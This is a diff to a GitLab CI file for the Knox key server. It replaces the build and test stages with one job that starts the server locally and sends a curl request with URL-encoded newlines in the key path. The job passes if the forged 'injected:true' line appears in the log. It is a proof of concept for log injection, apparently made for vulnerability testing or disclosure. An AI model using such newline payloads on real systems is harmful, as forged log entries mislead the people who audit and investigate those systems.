@@ -1,50 +1,33 @@
 stages:
-  - generate-certs
-  - build
   - test
-  - poc
 
 variables:
-  GOCACHE: "$CI_PROJECT_DIR/.cache"
+  SERVER_CERT: "server.crt"
+  SERVER_KEY: "server.key"
+  CA_CERT: "ca.crt"
+  CLIENT_CERT: "client.crt"
+  CLIENT_KEY: "client.key"
 
-generate_certs:
-  stage: generate-certs
-  image: alpine:latest
-  script:
-    - apk add --no-cache openssl
-    - mkdir -p certs
-    - openssl ecparam -name prime256v1 -genkey -noout -out certs/ca.key
-    - openssl req -x509 -new -nodes -key certs/ca.key -sha256 -days 1 -out certs/ca.crt -subj "/CN=MyCA"
-    - openssl ecparam -name prime256v1 -genkey -noout -out certs/server.key
-    - openssl req -new -key certs/server.key -out certs/server.csr -subj "/CN=localhost"
-    - openssl x509 -req -in certs/server.csr -CA certs/ca.crt -CAkey certs/ca.key -CAcreateserial -out certs/server.crt -days 1 -sha256
-    - openssl ecparam -name prime256v1 -genkey -noout -out certs/client.key
-    - openssl req -new -key certs/client.key -out certs/client.csr -subj "/CN=admin"
-    - openssl x509 -req -in certs/client.csr -CA certs/ca.crt -CAkey certs/ca.key -CAcreateserial -out certs/client.crt -days 1 -sha256
-  artifacts:
-    paths:
-      - certs/
-
-before_script:
-  - go version
-
-build:
-  stage: build
-  script:
-    - go build -o knox-dev-server ./cmd/dev_server
-
-test:
+test_log_injection:
   stage: test
+  image: golang:1.24
   script:
-    - go test -v ./...
+    # Save TLS certs from CI variables or artifacts (you need to set these securely in GitLab)
+    - echo "$SERVER_CERT_CONTENT" > $SERVER_CERT
+    - echo "$SERVER_KEY_CONTENT" > $SERVER_KEY
+    - echo "$CA_CERT_CONTENT" > $CA_CERT
+    - echo "$CLIENT_CERT_CONTENT" > $CLIENT_CERT
+    - echo "$CLIENT_KEY_CONTENT" > $CLIENT_KEY
 
-poc:
-  stage: poc
-  image: golang:1.20
-  script:
-    - go build -o knox-server knox-server-1/main.go
-    - ./knox-server --http :9000 --cert certs/server.crt --key certs/server.key --ca certs/ca.crt &
-    - sleep 2
-    - |
-      curl --cert certs/client.crt --key certs/client.key --cacert certs/ca.crt -k \
-        https://localhost:9000/v1/keys/foo
+    # Build the Knox server binary
+    - go build -o knox-server ./cmd/dev_server
+
+    # Start Knox server in background
+    - ./knox-server --http :9000 --cert $SERVER_CERT --key $SERVER_KEY --ca $CA_CERT > knox.log 2>&1 &
+    - sleep 3
+
+    # Send the malicious request with injected newlines in the key path
+    - curl --cert $CLIENT_CERT --key $CLIENT_KEY --cacert $CA_CERT -k "https://localhost:9000/v1/keys/%0Ainjected:true%0A"
+
+    # Check if injection string appears in logs
+    - if grep -q "injected:true" knox.log; then echo "Log injection succeeded"; else echo "Log injection failed" && exit 1; fi
